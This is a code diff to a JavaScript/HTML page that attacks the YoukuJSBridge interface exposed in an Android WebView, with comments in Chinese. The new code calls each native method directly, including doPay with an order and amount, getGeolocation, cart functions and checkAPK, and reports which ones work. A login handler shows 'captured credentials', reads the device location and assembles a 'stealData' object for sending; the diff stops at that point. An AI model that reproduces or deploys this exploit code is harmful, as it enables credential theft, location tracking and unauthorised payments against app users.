@@ -115,7 +115,7 @@
       font-size: 11px;
       white-space: pre-wrap;
       word-break: break-all;
-      max-height: 200px;
+      max-height: 300px;
       overflow-y: auto;
     }
   </style>
@@ -166,24 +166,6 @@
       document.getElementById('infoBox').innerHTML = msg;
     }
     
-    // 调用 YoukuJSBridge 方法（Java 对象桥接）
-    function callJSBridge(method, params) {
-      try {
-        // Java 对象的方法调用方式
-        if (typeof YoukuJSBridge === 'object') {
-          // 尝试直接调用
-          return YoukuJSBridge[method](params);
-        }
-        // 尝试作为函数调用
-        else if (typeof YoukuJSBridge === 'function') {
-          return YoukuJSBridge(method, params);
-        }
-      } catch (e) {
-        return 'Error: ' + e;
-      }
-      return 'Not available';
-    }
-    
     // 页面加载完成检测
     window.onload = function() {
       var info = '[*] 页面加载完成\n';
@@ -191,42 +173,128 @@
       
       if (typeof YoukuJSBridge !== 'undefined') {
         info += '\n[+] YoukuJSBridge 存在！\n';
-        info += '[*] 尝试调用方法...\n\n';
+        info += '[*] 开始探测可用方法...\n\n';
         
-        // 测试已知方法（Java 对象桥接）
-        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
-                           'setShareInfo', 'showLoginView', 'addItem2Cart', 
-                           'oneKeyAddCart', 'closeActivity', 'setTitleBar',
-                           'notifyVipChanged', 'startDiagnose', 'checkAPK',
-                           'addTaoKeItem2Cart', 'showOrderWithSKU', 'showTaoKeOrderWithSKU',
-                           'showUploadVideoPage', 'showShareView', 'addCollectionVideo',
-                           'b', 'a'];
+        // 直接调用已知方法（@JavascriptInterface 方式）
+        var testResults = [];
         
-        var successCount = 0;
-        var failCount = 0;
-        
-        for (var i = 0; i < knownMethods.length; i++) {
-          var method = knownMethods[i];
-          try {
-            // 尝试调用
-            var result = YoukuJSBridge[method]('{"test":true}');
-            info += '[+] ' + method + ': 成功\n';
-            info += '    返回值：' + result + '\n\n';
-            successCount++;
-          } catch (e) {
-            // 不调用 showLoginView 等会改变 UI 的方法
-            if (['showLoginView', 'closeActivity'].indexOf(method) === -1) {
-              info += '[-] ' + method + ': 失败\n';
-              info += '    错误：' + e.message + '\n\n';
-              failCount++;
-            }
-          }
+        // 测试 doPay
+        try {
+          var result = YoukuJSBridge.doPay('{"orderId":"TEST","amount":0.01}');
+          testResults.push('[+] doPay: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] doPay: 失败\n    错误：' + e.message);
         }
         
-        info += '\n================================\n';
-        info += '成功：' + successCount + ' 个\n';
-        info += '失败：' + failCount + ' 个\n';
+        // 测试 getAliCoupon
+        try {
+          var result = YoukuJSBridge.getAliCoupon('{"itemId":"TEST"}');
+          testResults.push('[+] getAliCoupon: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] getAliCoupon: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 getGeolocation
+        try {
+          var result = YoukuJSBridge.getGeolocation('{}');
+          testResults.push('[+] getGeolocation: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] getGeolocation: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 loadUrl
+        try {
+          YoukuJSBridge.loadUrl('{"url":"about:blank"}');
+          testResults.push('[+] loadUrl: 成功');
+        } catch (e) {
+          testResults.push('[-] loadUrl: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 setShareInfo
+        try {
+          YoukuJSBridge.setShareInfo('{"title":"Test"}');
+          testResults.push('[+] setShareInfo: 成功');
+        } catch (e) {
+          testResults.push('[-] setShareInfo: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 addItem2Cart
+        try {
+          var result = YoukuJSBridge.addItem2Cart('{"itemId":"TEST"}');
+          testResults.push('[+] addItem2Cart: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] addItem2Cart: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 oneKeyAddCart
+        try {
+          var result = YoukuJSBridge.oneKeyAddCart('{"itemId":"TEST"}');
+          testResults.push('[+] oneKeyAddCart: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] oneKeyAddCart: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 setTitleBar
+        try {
+          YoukuJSBridge.setTitleBar('{"title":"Test"}');
+          testResults.push('[+] setTitleBar: 成功');
+        } catch (e) {
+          testResults.push('[-] setTitleBar: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 notifyVipChanged
+        try {
+          YoukuJSBridge.notifyVipChanged('{}');
+          testResults.push('[+] notifyVipChanged: 成功');
+        } catch (e) {
+          testResults.push('[-] notifyVipChanged: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 startDiagnose
+        try {
+          var result = YoukuJSBridge.startDiagnose('{}');
+          testResults.push('[+] startDiagnose: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] startDiagnose: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 checkAPK
+        try {
+          var result = YoukuJSBridge.checkAPK('{"pkg":"com.test"}');
+          testResults.push('[+] checkAPK: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] checkAPK: 失败\n    错误：' + e.message);
+        }
+        
+        // 测试 addCollectionVideo
+        try {
+          var result = YoukuJSBridge.addCollectionVideo('{"videoId":"TEST"}');
+          testResults.push('[+] addCollectionVideo: 成功\n    返回值：' + result);
+        } catch (e) {
+          testResults.push('[-] addCollectionVideo: 失败\n    错误：' + e.message);
+        }
+        
+        // 显示所有结果
+        info += testResults.join('\n\n');
+        
+        // 统计
+        var successCount = testResults.filter(function(r) { return r.indexOf('成功') !== -1; }).length;
+        var failCount = testResults.filter(function(r) { return r.indexOf('失败') !== -1; }).length;
+        
+        info += '\n\n================================\n';
+        info += '成功：' + successCount + ' 个方法\n';
+        info += '失败：' + failCount + ' 个方法\n';
         info += '================================\n';
+        
+        // 显示可用的方法列表
+        info += '\n[*] 确认可用的方法:\n';
+        testResults.forEach(function(r) {
+          if (r.indexOf('成功') !== -1) {
+            var methodName = r.split(':')[0].replace('[+] ', '');
+            info += '  - ' + methodName + '()\n';
+          }
+        });
+        
       } else {
         info += '\n[-] YoukuJSBridge 不存在';
       }
@@ -247,11 +315,11 @@
       // 显示捕获到凭证
       alert('[*] 捕获到凭证:\n用户名：' + username + '\n密码：' + password);
        
-      // 尝试调用 YoukuJSBridge（如果在 WebView 中）
+      // 尝试调用 YoukuJSBridge
       if (typeof YoukuJSBridge !== 'undefined') {
         alert('[+] YoukuJSBridge 可用！');
          
-        // 尝试获取地理位置
+        // 获取地理位置
         try {
           var location = YoukuJSBridge.getGeolocation('{}');
           alert('[+] 获取到位置：' + location);
@@ -259,25 +327,7 @@
           alert('[-] 位置获取失败：' + err.message);
         }
          
-        // 测试所有已知方法
-        var testResults = [];
-        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
-                           'setShareInfo', 'addItem2Cart', 'oneKeyAddCart', 
-                           'setTitleBar', 'notifyVipChanged', 'startDiagnose'];
-        
-        for (var i = 0; i < knownMethods.length; i++) {
-          var method = knownMethods[i];
-          try {
-            var result = YoukuJSBridge[method]('{"test":true}');
-            testResults.push('[+] ' + method + ': 成功\n返回值：' + result);
-          } catch (err) {
-            testResults.push('[-] ' + method + ': 失败\n错误：' + err.message);
-          }
-        }
-        
-        alert('方法测试结果:\n\n' + testResults.join('\n\n'));
-         
-        // 尝试通过 JSBridge 发送
+        // 发送数据
         try {
           var stealData = {
             username: username,
